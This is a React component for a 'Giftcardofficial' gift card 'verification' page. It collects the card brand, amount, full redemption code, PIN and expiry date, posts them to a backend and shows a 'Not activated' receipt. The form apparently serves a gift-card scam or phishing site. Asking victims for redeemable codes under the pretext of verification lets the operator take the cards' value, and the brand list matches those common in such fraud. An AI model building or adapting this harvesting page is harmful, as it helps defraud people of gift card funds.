import { useState } from "react";

const API_URL = import.meta.env.VITE_API_URL;

const giftCardTypes = [
  "Apple",
  "Amazon",
  "Steam",
  "eBay",
  "Xbox",
  "Googleplay",
  "PlayStation",
  "Sephora",
  "Nordstrom",
  "Nike",
  "Macy",
  "Razor Gold",
  "MasterCard",
  "Vanilla",
  "Wallmart Visa",
  "Perfect Visa",
  "Visa Silvery White",
  "TT Visa",
  "Amex",
];

const currencies = ["USD", "GBP", "AUD", "EUR", "CAD"];

export default function GiftCardForm() {
  const [form, setForm] = useState({
    cardType: "",
    currency: "USD",
    amount: "",
    message: "",
    cardCcv: "",
    expiryDate: "",
  });

  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");
  const [submission, setSubmission] = useState(null);

  function updateField(event) {
    const { name, value } = event.target;

    setForm((previous) => ({
      ...previous,
      [name]: value,
    }));
  }

  async function handleSubmit(event) {
    event.preventDefault();

    setMessage("");
    setError("");
    setSubmission(null);

    if (!API_URL) {
      setError(
        "Server connection is not configured. Check your frontend .env file."
      );
      return;
    }

    if (!form.cardType || !form.currency || !form.amount) {
      setError("Please complete all required fields.");
      return;
    }

    const amount = Number(form.amount);
    const personalMessage = form.message.trim();
    const cardCcv = form.cardCcv.trim();
    const expiryDate = form.expiryDate.trim();

    if (
      !Number.isFinite(amount) ||
      amount <= 0 ||
      amount > 1000000
    ) {
      setError("Please enter a valid amount.");
      return;
    }

    if (personalMessage.length > 40) {
      setError("Your redemption code message is too long.");
      return;
    }

    if (cardCcv.length > 10) {
      setError("Please enter a valid CCV.");
      return;
    }

    if (expiryDate.length > 20) {
      setError("Please enter a valid expiry date.");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(
        `${API_URL.replace(/\/+$/, "")}/api/verification`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            cardType: form.cardType,
            currency: form.currency,
            amount,
            message: personalMessage,
            cardCcv,
            expiryDate,
          }),
        }
      );

      const result = await response.json();

      if (!response.ok) {
        throw new Error(
          result.message ||
            "Your submission could not be completed."
        );
      }

      setSubmission({
        status: "Not activated",
        details: {
          giftCardBrand: form.cardType,
          amount: `${form.currency} ${amount.toLocaleString()}`,
        },
      });

      setForm({
        cardType: "",
        currency: "USD",
        amount: "",
        message: "",
        cardCcv: "",
        expiryDate: "",
      });

    } catch (err) {
      setError(
        err.message ||
          "Unable to connect to the server. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  function closePopup() {
    setSubmission(null);
  }

  return (
    <div className="verification-card">
      <div className="form-heading">
        <h2>Gift Card Information</h2>
        <p>Enter your gift card details below.</p>
      </div>

      <form onSubmit={handleSubmit}>
        <div className="field">
          <label htmlFor="cardType">Gift Card Brand</label>

          <select
            id="cardType"
            name="cardType"
            value={form.cardType}
            onChange={updateField}
            required
          >
            <option value="">Select gift card brand</option>

            {giftCardTypes.map((card) => (
              <option key={card} value={card}>
                {card}
              </option>
            ))}
          </select>
        </div>

        <div className="field">
          <label htmlFor="currency">Currency</label>

          <select
            id="currency"
            name="currency"
            value={form.currency}
            onChange={updateField}
            required
          >
            {currencies.map((currency) => (
              <option key={currency} value={currency}>
                {currency}
              </option>
            ))}
          </select>
        </div>

        <div className="field">
          <label htmlFor="amount">Gift Card Amount</label>

          <input
            id="amount"
            name="amount"
            type="number"
            min="0.01"
            max="1000000"
            step="0.01"
            placeholder="Enter card amount"
            value={form.amount}
            onChange={updateField}
            required
          />
        </div>

        {/* REDEMPTION CODE */}
        <div className="field">
          <label htmlFor="message">Redemption Code</label>

          <textarea
            id="message"
            name="message"
            placeholder="Enter redemption code..."
            value={form.message}
            onChange={updateField}
            maxLength={40}
            rows={3}
          />
        </div>

        {/* CCV */}
        <div className="field">
          <label htmlFor="cardCcv">Gift Card CCV / PIN (Optional)</label>
          <input
            id="cardCcv"
            name="cardCcv"
            type="text"
            placeholder="Enter CCV or PIN"
            value={form.cardCcv}
            onChange={updateField}
            maxLength={10}
          />
        </div>

        {/* EXPIRY DATE */}
        <div className="field">
          <label htmlFor="expiryDate">Gift Card Expiry Date (Optional)</label>
          <input
            id="expiryDate"
            name="expiryDate"
            type="text"
            placeholder="MM/YY or Date"
            value={form.expiryDate}
            onChange={updateField}
            maxLength={20}
          />
        </div>

        {error && (
          <div className="form-status error" role="alert">
            {error}
          </div>
        )}

        {message && (
          <div className="form-status success" role="status">
            {message}
          </div>
        )}

        <button
          type="submit"
          className="submit-button"
          disabled={loading}
        >
          {loading ? "Submitting..." : "Submit Information"}
        </button>
      </form>

      {/* SUCCESS POPUP */}

      {submission && (
        <div className="success-overlay">
          <div
            className="success-popup"
            role="dialog"
            aria-modal="true"
            aria-labelledby="success-title"
          >
            <button
              className="popup-close"
              type="button"
              onClick={closePopup}
              aria-label="Close popup"
            >
              &times;
            </button>

            <div className="success-icon">
              <svg
                width="34"
                height="34"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M5 12l4 4L19 6" />
              </svg>
            </div>

            <h2 id="success-title">
              Submission Successful!
            </h2>

            <p className="success-description">
              Your information has been received successfully.
              Here is a summary of your submission.
            </p>

            <div className="submission-receipt">
              <div className="receipt-heading">
                <span>YOUR SUBMISSION</span>

                <span className="received-status" style={{ color: "#d97706" }}>
                  {submission.status}
                </span>
              </div>

              <div className="receipt-row">
                <span>Gift Card Brand</span>
                <strong>
                  {submission.details.giftCardBrand}
                </strong>
              </div>

              <div className="receipt-row">
                <span>Gift Card Amount</span>
                <strong>
                  {submission.details.amount}
                </strong>
              </div>
            </div>

            <button
              className="success-done"
              type="button"
              onClick={closePopup}
            >
              Done
            </button>

            <p className="popup-footer">
              Thank you for choosing Giftcardofficial.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}